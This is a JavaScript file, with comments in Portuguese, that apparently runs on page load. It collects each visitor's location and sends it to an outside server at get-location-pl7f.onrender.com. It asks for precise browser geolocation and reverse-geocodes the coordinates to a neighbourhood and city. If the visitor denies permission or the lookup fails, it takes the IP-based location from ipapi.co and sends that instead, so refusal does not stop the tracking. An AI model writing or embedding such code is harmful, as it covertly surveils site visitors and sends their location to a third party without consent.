registrarIP()

window.onload = function () {
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      (position) => {

        const data = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
        };

        // console.log("Localização obtida:", data);
        
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.latitude}&lon=${data.longitude}`;

        fetch(url, {
          headers: {
            "User-Agent": "SeuApp/1.0", // Recomendado pela Nominatim
            "Accept-Language": "pt-BR", // Opcional, define idioma da resposta
          }
        })
          .then(response => response.json())
          .then(locationData => {

            fetch('https://get-location-pl7f.onrender.com/location',{
              method: 'POST',
              headers:{
                "Content-Type": "application/json"
              },
              body:JSON.stringify({
                neighbourhood: locationData.address.suburb || locationData.address.neighbourhood || 'Vazio',
                city: locationData.address.city || locationData.address.town || locationData.address.village || 'Vazio',
                latitude: data.latitude,
                longitude: data.longitude
              })
            })
            // console.log("Endereço completo:", locationData);
            // console.log("Cidade:", locationData.address.city || locationData.address.town || locationData.address.village);
            // console.log("Bairro:", locationData.address.suburb || locationData.address.neighbourhood);
            // console.log("Estado:", locationData.address.state);
            // console.log("País:", locationData.address.country);
          })
          .catch(error => {
            console.error("Erro ao buscar endereço:", error);
          });
      },
      (error) => {
        // Tratamento de erro
        switch (error.code) {
          case error.PERMISSION_DENIED:
            // console.error("Usuário negou a permissão de localização.");
            registrarIP()
            break;
          case error.POSITION_UNAVAILABLE:
            // console.error("Informações de localização indisponíveis.");
            registrarIP()
            break;
          case error.TIMEOUT:
            // console.error("Tempo esgotado ao tentar obter a localização.");
            registrarIP()
            break;
          case error.UNKNOWN_ERROR:
            registrarIP()
          default:
            // console.error("Ocorreu um erro desconhecido ao obter a localização.");
            break;
        }
      }
    );
  } else {
    console.error("Geolocalização não é suportada neste navegador.");
  }
};
async function registrarIP() {
  try {
    // Consulta IP e localização aproximada
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    console.log(data)

    // Envia os dados para o servidor
    await fetch("https://get-location-pl7f.onrender.com/location", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        neighbourhood: 'Dados vieram via IP',
        city: data.city,
        latitude: data.latitude,
        longitude: data.longitude,
      })
    });

  } catch (e) {
    // document.getElementById("resultado").textContent = "Erro ao obter IP";
    console.error(e);
  }
}

